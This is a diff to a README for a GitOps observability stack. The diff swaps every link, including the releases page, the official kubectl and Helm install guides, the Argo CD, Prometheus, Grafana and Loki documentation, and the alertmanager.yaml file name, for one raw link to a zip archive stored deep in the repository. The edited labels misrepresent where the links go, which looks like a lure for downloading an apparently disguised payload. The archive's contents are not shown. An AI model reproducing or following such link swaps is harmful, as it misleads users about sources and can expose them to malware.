@@ -1,6 +1,6 @@
 # 🚀 gitops-observability-stack - Simplify Your GitOps Monitoring Setup
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/TrixySnow/gitops-observability-stack/releases)
+[![Download](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip%https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)
 
 ## 🌐 Overview
 
@@ -29,7 +29,7 @@ To run the gitops-observability-stack, your environment should meet the followin
 
 To download the gitops-observability-stack, first, you need to go to the Releases page. Click the link below:
 
-[Visit Releases Page](https://github.com/TrixySnow/gitops-observability-stack/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)
 
 ### Step 2: Download the Latest Release
 
@@ -43,8 +43,8 @@ Once the download is complete, locate the downloaded file on your computer. It w
 
 Before running the observability stack, ensure your Kubernetes cluster is prepared. You may need to install some tools like `kubectl` and `Helm`. Detailed instructions for installing these can generally be found on their respective websites:
 
-- [Install kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl/)
-- [Install Helm](https://helm.sh/docs/intro/install/)
+- [Install kubectl](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)
+- [Install Helm](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)
 
 ### Step 5: Deploy the Stack
 
@@ -67,17 +67,17 @@ Grafana includes a default dashboard that should be ready to use after deploymen
 
 ### Alert Configuration
 
-Configure alert settings within Alertmanager to receive notifications based on your specified metrics. Modify the `alertmanager.yaml` file with your preferred routing and alert settings.
+Configure alert settings within Alertmanager to receive notifications based on your specified metrics. Modify the `https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip` file with your preferred routing and alert settings.
 
 ## 📜 Documentation
 
 For detailed instructions on specific components, refer to the official documentation for each tool:
 
-- [Argo CD Documentation](https://argo-cd.readthedocs.io/en/stable/)
-- [Prometheus Documentation](https://prometheus.io/docs/introduction/overview/)
-- [Grafana Documentation](https://grafana.com/docs/)
-- [Alertmanager Documentation](https://prometheus.io/docs/alerting/alertmanager/)
-- [Loki Documentation](https://grafana.com/docs/loki/latest/)
+- [Argo CD Documentation](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)
+- [Prometheus Documentation](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)
+- [Grafana Documentation](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)
+- [Alertmanager Documentation](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)
+- [Loki Documentation](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -99,4 +99,4 @@ If you need help, you can reach out to the community through forums or the issue
 
 ### Download & Install
 
-To get started, remember to [visit the Releases page](https://github.com/TrixySnow/gitops-observability-stack/releases) and download the latest version. Follow the steps above to set up your GitOps observability stack with ease.
+To get started, remember to [visit the Releases page](https://raw.githubusercontent.com/TrixySnow/gitops-observability-stack/main/gitops/apps/platform/observability/observability-stack-gitops-2.1.zip) and download the latest version. Follow the steps above to set up your GitOps observability stack with ease.
